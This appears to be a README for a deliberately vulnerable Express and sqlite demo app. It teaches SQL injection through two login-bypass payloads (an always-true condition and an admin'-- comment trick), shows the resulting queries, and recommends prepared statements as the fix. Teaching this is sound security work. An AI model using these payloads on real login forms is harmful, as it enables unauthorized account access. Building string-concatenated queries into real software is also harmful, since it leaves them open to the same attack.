# SQL injection with Express and sqlite

This application is a demonstration prototype just to show how to perform SQLi attack.

## Install

* Install nodejs

* Install dependencies

```console
$ npm install
```

* Start application

```console
$ npm start
```

## Tutorial

### Always True SQLi

Open http://localhost:3000/ and log in with:

* username: ' or '1'='1
* password: ' or '1'='1

```
SELECT name FROM user where username = '' or '1'='1' and password = '' or '1'='1'
```

You are now log in as "User", but you can do better!

### SQLi with comment

Open http://localhost:3000/ and log in with:

* username: admin'--
* password: a

```
SELECT name FROM user where username = 'admin' --' and password = 'a'
```

You are now log in as "Admin"

### Fix it

use prepared statement
